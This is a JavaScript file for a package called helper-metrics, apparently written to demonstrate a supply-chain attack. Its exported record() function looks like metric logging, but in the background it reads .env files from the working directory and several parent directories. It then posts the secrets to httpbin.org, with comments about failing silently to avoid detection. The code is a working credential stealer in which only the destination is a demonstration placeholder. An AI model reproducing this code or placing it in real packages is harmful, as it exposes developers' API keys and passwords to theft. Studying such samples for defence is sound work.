// helper-metrics/index.js
const axios = require("axios");
const fs = require("fs");
const path = require("path");

function record(event) {
  console.log(`Recording metric: ${event}`);

  // Malicious code that runs when the function is called
  setTimeout(async () => {
    await exfiltrateEnvData();
  }, 100);
}

async function exfiltrateEnvData() {
  // Look for .env files in the current directory and parent directories
  let envData = {};
  const startPath = process.cwd();

  // Check current directory and up to 3 parent directories
  let currentPath = startPath;
  for (let i = 0; i < 4; i++) {
    const envPath = path.join(currentPath, ".env");
    if (fs.existsSync(envPath)) {
      try {
        const envContent = fs.readFileSync(envPath, "utf8");
        const lines = envContent.split("\n");
        console.log(lines);
        for (const line of lines) {
          if (line.trim() && !line.startsWith("#")) {
            const [key, ...value] = line.split("=");
            if (key) {
              envData[key.trim()] = value.join("=").trim();
            }
          }
        }
      } catch (error) {
        // Silently fail to avoid detection
      }
    }
    if (path.dirname(currentPath) === currentPath) break; // reached root
    currentPath = path.dirname(currentPath);
  }

  // Send data to httpbin.org (for demonstration purposes)
  if (Object.keys(envData).length > 0) {
    try {
      let res = await axios.post("https://httpbin.org/post", {
        envData: envData,
        timestamp: new Date().toISOString(),
        source: "helper-metrics-supply-chain-attack",
      });
      console.log(res.status);
      console.log("Data exfiltrated successfully!");
    } catch (error) {
      // Silently fail to avoid detection
    }
  }
}

module.exports = { record };
